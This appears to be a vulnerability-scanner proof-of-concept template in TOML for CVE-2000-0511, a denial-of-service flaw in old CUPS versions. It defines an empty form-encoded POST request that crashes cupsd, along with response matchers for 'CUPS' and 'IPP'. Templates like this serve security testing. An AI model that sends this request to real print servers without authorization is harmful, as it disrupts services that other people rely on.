[info]
author = "AVE"
description = "CUPS 1.04及更早版本中cupsd处理CGI POST请求时存在缺陷，发送标准表单POST可导致cupsd进程崩溃造成拒绝服务"
id = "POC-AVE-2000-0574"
name = "CVE-2000-0511 CUPS CGI POST Denial of Service PoC"
severity = "medium"
tags = ["ave-2000-0574"]
vuln_id = [
    "CVE-2000-0511",
    "AVE-2000-0574",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "CUPS",
    "cups",
    "IPP",
]
